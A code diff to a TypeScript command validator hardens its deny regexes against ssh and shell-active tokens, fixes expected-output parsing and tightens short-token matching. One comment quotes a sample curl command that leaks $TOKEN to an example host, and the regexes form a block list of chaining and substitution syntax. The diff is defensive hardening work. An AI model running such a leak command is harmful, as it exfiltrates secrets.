@@ -24,8 +24,18 @@ export type ClassifyInput = {
   timeoutMs?: number;
 };
 
-const SSH_REJECT_RE = /(^|[\s/])ssh([\s]|$)/;
-const SUBST_REJECT_RE = /(\$\(|`|<\(|>\()/;
+// Use POSIX [:space:] equivalent (not \s) so the TS reject regex behaves
+// identically to bash's [[:space:]] in C-locale. \s in JS matches Unicode
+// whitespace (U+00A0, U+2028, etc.); bash [[:space:]] in C-locale does not.
+// Keeping the surface narrow avoids cross-runtime drift bypasses.
+const SSH_REJECT_RE = /(^|[\t\n\r \f\v/])ssh([\t\n\r \f\v]|$)/;
+
+// Shell-active tokens that route command output / chain commands / spawn
+// subshells / expand vars. The plan author is trust-on-PR-review but the env
+// scrub in SKILL.md Step 10.5 is the load-bearing mitigation — this regex
+// is defense-in-depth. Note: `$` (parameter expansion) IS rejected to block
+// `curl https://api.example.com/?leak=$TOKEN` even with env scrub.
+const SUBST_REJECT_RE = /(\$\(|`|<\(|>\(|;|&&|\|\||\||>|<|&|\$\{?[A-Za-z_])/;
 
 export function extractObservabilityBlock(planBody: string): string {
   const lines = planBody.split(/\r?\n/);
@@ -100,8 +110,11 @@ export function parseExpected(observabilityBlock: string): string {
     const yamlKey = line.match(/^\s*expected_output:\s*(.+)$/);
     if (yamlKey) return stripQuotes(yamlKey[1].trim());
   }
+  // Prose form accepts bold-wrapped (`**Expected output:**`) since markdown
+  // plans frequently bold the inline label. Both `Expected output:` and
+  // `**Expected output:**` produce the same captured value.
   for (const line of lines) {
-    const prose = line.match(/^\s*Expected output:\s*(.+)$/i);
+    const prose = line.match(/^\s*(?:\*\*)?Expected output:(?:\*\*)?\s*(.+)$/i);
     if (prose) return stripQuotes(prose[1].trim());
   }
   return "";
@@ -111,7 +124,14 @@ export function matchExpected(expected: string, actualStdout: string): boolean {
   const normalized = actualStdout.replace(/\n+$/, "").trim();
   if (normalized === "") return false;
   const tokens = tokenizeExpected(expected);
-  return tokens.some((tok) => tok !== "" && normalized.includes(tok));
+  return tokens.some((tok) => {
+    if (tok === "") return false;
+    // Short tokens (≤ 2 chars) match only when stdout is exactly the token —
+    // prevents `expected_output: "0"` matching every HTTP error response that
+    // happens to contain a `0` digit (500, 404, 200, 302, etc.).
+    if (tok.length <= 2) return normalized === tok;
+    return normalized.includes(tok);
+  });
 }
 
 export function tokenizeExpected(expected: string): string[] {
@@ -126,7 +146,7 @@ export function rejectReason(cmd: string): string | null {
     return "discoverability_test.command contains ssh (rule violation per hr-observability-as-plan-quality-gate)";
   }
   if (SUBST_REJECT_RE.test(cmd)) {
-    return "discoverability_test.command contains command or process substitution; refusing to run (defense-in-depth)";
+    return "discoverability_test.command contains shell-active token (;, &&, ||, |, >, <, &, $var, $(, `, <(, >() — refusing to run. Plans must compose single-statement commands without chaining or substitution.";
   }
   return null;
 }
